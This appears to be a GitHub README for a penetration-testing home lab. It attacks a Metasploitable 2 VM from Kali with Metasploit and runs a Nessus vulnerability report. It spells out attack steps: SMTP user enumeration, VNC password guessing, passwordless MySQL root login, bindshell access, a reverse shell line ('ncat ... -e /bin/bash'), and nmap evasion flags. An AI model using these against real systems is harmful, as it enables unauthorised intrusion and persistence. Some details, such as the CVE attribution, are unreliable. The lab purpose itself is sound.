# Metasploitable-Nessus-Project
This project is about setting up a Metasploitable 2 virtual machine and a Kali Linux virtual machine in VirtualBox. Then doing some basic hacks on the Metasploitable VM. Then doing a Nessus scan to create a vulnerability report.
<br><br>
Scenario: a client asks me to do a vulnerability assessment on their network. I will first map the network, identify all devices on the network, identify open ports on each device and services/applications running on each port, then do vulnerability scans on each device in the network, then create a report to return to the client including a diagram of their network, a list of vulnerabilities on the devices in their network, and a path to fixing all the vulnerabilities.  
<br>
This idea for this project came from MyDFIR.<br>
https://youtu.be/G7e5Uw6RO_E?si=z9fg1MsDhFgtP9Z_&t=726
<br><br>
_________________________
**Installing VirtualBox**<br>
-Make sure virtualization is enabled on your computer.<br>
-Download VirtualBox from this link: 
https://www.virtualbox.org/wiki/Downloads<br>
-Install it.<br>

**Installing Metasploitable 2**<br>
-Download Metasploitable 2 from this link: 
https://docs.rapid7.com/metasploit/metasploitable-2/<br>
-Open VirtualBox and create a new virtual machine and use the virtual machine hard disk.<br>
-Make sure it is on the same network as the machine you will run Nessus on.<br>
-Boot it up and sign in using credentials: msfadmin for the username and password.<br>
-For a walkthrough, follow this YouTube tutorial: 
https://youtu.be/1rIvnMenA2g?si=UOwItJeTInN6-GU6<br>

**Downloading Kali Linux**<br> 
-Download Kali Linux from this link: 
https://www.kali.org/get-kali/#kali-virtual-machines<br>
-Open VirtualBox and create a new virtual machine and use the .iso file.<br>
-Boot it up.<br>

**Installing Nessus**<br>
-Download Nessus from this link:
https://www.tenable.com/downloads/nessus<br>
-Confirm download integrity using checksum then install it.<br>
-Connect via SSL and get Nessus Essentials for the free version.<br>
-Create an account and activation code.<br>
-Wait until the plugins are finished before doing a scan.<br>
-For a walkthrough, follow this YouTube tutorial: 
https://youtu.be/G7e5Uw6RO_E?si=UQfBaMUNhvuEMk35<br>

**Hacks on Metasploitable VM from Kali VM**<br>
**Hack One:** I exploited CVE-2024-4577, an argument injection vulnerability in PHP, which gave me access to an Apache server which was running PHP scripts.<br>
-Do an nmap scan on Metasploitable IP address for open ports and running services (nmap [IP ADDRESS OF TARGET] -sV).<br>
-Port 80, which is HTTP, is open.<br>
-Opened Metasploit Framework (MSF) console (msfconsole).<br>
-Find a scanner to find what is running on HTTP and its version (grep scanner search http_version).<br>
-The results should show scanners for HTTP.<br>
-Use the listed scanner (use 0) and list the details of the scanner (show options) then configure the missing details like rhosts (set rhosts [IP ADDRESS OF TARGET]) and run the scanner (run).<br>
-The result of the scan shows the services and versions of the services running on HTTP port 80.<br>
-Then search for vulnerabilities for that version of the service and limit the search to only show vulnerabilities that have something to do with whats it running on the service (searchsploit Apache 2.2.8 | grep php).<br>
-The result of this search should be vulnerabilities on this service.<br>
-Next search through Metasploitable for any exploits for any of those vulnerabilities (grep cgi search php 5.4.2).<br>
-The result of the search should return ready-to-use exploits.
-Use it (use 1) and look at the details of the exploit (show options) and fill in any details you need like rhosts (set rhosts [IP ADDRESS OF TARGET]) and exploit it (exploit).<br>
-Confirm you are now in the target machine (sysinfo (this should return information about the target system)).<br>
<br>

**Hack Two:** I gathered a list of user accounts from an SMTP server.<br>
-Do an nmap scan on Metasploitable IP address for open ports and running services (nmap [IP ADDRESS] -sV).<br>
-Port 25, which is SMTP, is open.<br>
-Opened Metasploit Framework (MSF) console (msfconsole).<br>
-Pick a scanner for SMTP (grep scanner search smtp).<br>
-The results should show scanners for SMTP.<br>
-Pick the scan you want (use 25) and show the details of the scan (show options) and configure missing details need for the scan (set rhosts [IP ADDRESS OF TARGET]) and run the scan (run).<br>
-This scan will enumerate through a user list and try to verify user accounts on the SMTP server using a list that already comes with Kali and Metasploitable called USER_FILE which is found the detail when you run show options. The result of this is scan will be a list of user accounts found on the SMTP server.<br>
-Now you have a list of user accounts on the SMTP server that you can attack further.
-You can also access the SMTP server using Telnet (telnet [IP ADDRESS OF TARGET] 25) and now you are in the SMTP server.<br>
<br>

**Hack Three:** I found an account login password on a VNC server.<br>
-Do an nmap scan on Metasploitable IP address for open ports and running services (nmap [IP ADDRESS] -sV).<br>
-Port 5900, which is VNC, is open.<br>
-Opened Metasploit Framework (MSF) console (msfconsole).<br>
-Pick a scanner for VNC (grep scanner search vnc).<br>
-The results should show scanners for VNC.<br>
-Pick the scan you want (use 88) and show the details of the scan (show options) and configure missing details need for the scan (set rhosts [IP ADDRESS OF TARGET]) and run the scan (run).<br>
-This scan will enumerate through a password list and try to log into user accounts on the VNC server using a list that already comes with Kali and Metasploitable called PASS_FILE which is found the detail when you run show options. The details show here that there is no selected, or required, username or username list but one can be added. This scan will result in successful logins from the password list, if any.<br>
-The result of this scan found an account where the password was "password" that you can now simply log into.<br>
<br>

**Hack Four:** I logged into the root user account of a MySQL server.<br>
-Do an nmap scan on Metasploitable IP address for open ports and running services (nmap [IP ADDRESS] -sV).<br>
-Port 3306, which is MySQL, is open.<br>
-Opened Metasploit Framework (MSF) console (msfconsole).<br>
-Pick a scanner for MySQL (grep scanner search mysql).<br>
-The results should show scanners for VNC.<br>
-Pick the scan you want (use 18) and show the details of the scan (show options) and configure missing details need for the scan (set rhosts [IP ADDRESS OF TARGET]) and run the scan (run).<br>
-The details of this scan shows that it is going to try to find a login for a username of "root", which is a safe bet considering there is always some type of root user, but those details can be changed if so desired (set [field] [information for the field]).<br>
-The result of this scan found a root account but was unable to get the password because the length of the password was 0 characters, meaning there is no password for the root account.<br>
-Try to log into the MySQL root account of the Metasploitable server (mysql -u root -h [IP ADDRESS OF TARGET] -p) and read the error message saying "TLS/SSL error: wrong version number" meaning the version of SSL/TLS is outdated or bad for one reason or another.<br>
-Modify the MySQL command to skip SSL/TLS certification altogether (mysql -u root -h [IP ADDRESS OF TARGET] -p --skip-ssl) and want prompted for the password hit enter.<br>
-You are now in the target's MySQL account as the root user.<br>
<br>

**Hack Five:** I connected to the target machine with a bind shell and set up a reverse shell.<br>
-Do an nmap scan on Metasploitable IP address for open ports and running services (nmap [IP ADDRESS] -sV).<br>
-Found a Bindshell open on port 1524.<br>
-Opened Metasploit Framework (MSF) console (msfconsole).<br>
-Used netcat (ncat [IP ADDRESS OF TARGET] 1524) (could have also used telnet or ssh on port 1524 or on their own specific ports) and accessed the target machine.<br>
-You now have access to the target machine using a bind shell.<br>
<br>
The next part will be setting up a reverse shell which is used for an attacker to be able to continue to access a target machine after the initial infiltration, for persistance.<br>
<br>
-Set up a listener on your machine over any open port (nc -nvlp [PORT NUMBER]).<br> 
-Once you are already in the target machine, use netcat (or another tool like telnet or ssh) to establish a connection back to the your machine (ncat [YOUR IP ADDRESS] [SAME PORT NUMBER] -e /bin/bash).<br>
-The listener on your machine will pick up the connection and now you have an active reverse shell and can access the target machine and have the connection being established from within the target machine, which is better than a bindshell because there is no open listening port on the target machine which may look suspicous to network monitoring tools, there is no need to evade any firewall restrictions, there is no need to try to get around the target using NAT, there is no issue if the target's IP address changes, etc.<br>
<br>

-For a walkthrough on any of these hacks, follow this YouTube playlist: 
https://youtube.com/playlist?list=PLZEN0mW2CQl38fx0wtv53VEmn5CKJIrLA&si=QwL9kPkdTvL_J5a1<br>
<br>

**Nessus Scans**<br>
-Download and install Nessus on either the attacker machine or even better, the host machine or anywhere else.<br>
-Connect to Nessus Essentials (the free one), create an account/sign in, wait for plugins to finish (which takes hours)<br>
-Start a new scan (host discovery finds lives hosts and open ports like nmap and a basic network scan runs a full scan on the host).<br>
-Configure the template for the scan so you can reuse it later if needed. Configure the name, description, targets, schedule, scan types, reporting details, credentials (for authenticated scans which go deeper and provide more information).<br>
-When the scan is complete a PDF report will be available that identifies the vulnerabilities, categorizes them based on severity, and provides actionable recommendations to resolve them.<br>
-Details about each vulnerabilty is available for further analysis which contains CVE information from MITRE&ACK, how to vulnerability was discovered by the scan, the severity grading scale, ways to resolve the vulnerability, and information about the affects of explotation.<br>
-Review each vulnerability, create a more in-depth report than the one provided including which vulnerability should be handled first, the reasoning the order, the path to closure, the cost of each fix, and any other relevant information.<br>
<br>

**Advanced Nmap Scans**<br>
-**nmap [ip addr] >> [txt doc]** : to append the results of the nmap scan to a text doc. Example: "nmap 111.222.333.444 >> nmap_results.txt"<br>
-**nmap -A [ip addr]** : an aggressive scan which detects OS, versions of running software, script scanning, traceroute scan. If the target has an Intrusion Prevension System (IPS) this type of scan might get most of the detailed blocked. Example: "nmap -A 111.222.333.4444"<br>
-**nmap -F [ip addr]** : a fast scan which only scans most common 100 ports instead of a normal scan which which thousands. Example: "nmap -F 111.222.333.444"<br>
-**nmap -sS [ip addr]** : this is a tcp/syn scan. It sends packets to the target and if the port is open it will send ack packages back to the attacker but it does not complete the handshake. Because it never completes the handshake it is a quiet scan, meaning no established connections will show in log files. Example: "nmap -sS 111.222.333.444"<br>
-**nmap --scan-delay [time value in ms] [ip addr]** : to slow down the scan so it does not get detected by an IDS and blocked by an IPS because activity that is too fast is suspicious and will get flagged. Example: "nmap --scan-delay 200ms 111.222.333.444"<br>
-**nmap -f [ip addr]** : to fragment the scan into smaller packets to help bypass firewalls and filters. Large scans may have limits and may get blocked for being suspiciously large trying to get through the network. Example: "nmap -f 111.222.333.444"<br>
 <br>

 -For a walkthrough on these scans, watch this YouTube video:
 https://youtu.be/zfn-p_D_ADQ?si=M_NkdA6HKeMUejdU <br>
